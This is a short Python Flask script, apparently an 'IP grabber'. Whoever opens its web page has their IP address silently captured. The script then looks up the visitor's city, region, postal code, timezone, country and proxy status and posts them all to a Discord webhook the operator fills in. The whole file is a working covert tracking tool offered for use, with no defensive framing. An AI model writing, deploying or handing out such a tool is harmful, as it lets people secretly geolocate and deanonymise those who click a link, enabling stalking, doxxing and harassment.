from flask import Flask, request
from dhooks import Webhook, Embed
import requests
hook = Webhook("YOURWEBHOOK")
app = Flask(__name__)
@app.route('/')
def grabbing():
  if request.environ.get('HTTP_X_FORWARDED_FOR') is None:
    publicip = request.environ['REMOTE_ADDR']
  else:
    publicip = request.environ['HTTP_X_FORWARDED_FOR']
  city = requests.get(f'https://ipapi.co/{publicip}/city').text
  region = requests.get(f'https://ipapi.co/{publicip}/region').text
  postal = requests.get(f'https://ipapi.co/{publicip}/postal').text
  timezone = requests.get(f'https://ipapi.co/{publicip}/timezone').text
  currency = requests.get(f'https://ipapi.co/{publicip}/currency').text
  country = requests.get(f'https://ipapi.co/{publicip}/country_name').text
  callcode = requests.get(f"https://ipapi.co/{publicip}/country_calling_code").text
  proxyunc = requests.get(f'https://api.xdefcon.com/proxy/check/?ip={publicip}').text
  if '"proxy": true' in proxyunc:
      proxy = "Yes"
  else:
      proxy = "No"
  embed = Embed(
      color=0x5CDBF0,
      timestamp='now'
  )
  embed.set_footer(text='Coded by https://github.com/baum1810')
  embed.add_field(name='Ip', value=publicip)
  embed.add_field(name='City', value=city)
  embed.add_field(name='Region', value=region)
  embed.add_field(name='Postal', value=postal)
  embed.add_field(name='Timezone', value=timezone)
  embed.add_field(name='Currency', value=f'{currency}' )
  embed.add_field(name='Country', value=country)
  embed.add_field(name='Callcode', value=callcode)
  embed.add_field(name='Proxy', value=proxy)#
  hook.send(embed=embed)

  
app.run(debug=False,host='0.0.0.0', port=8000)
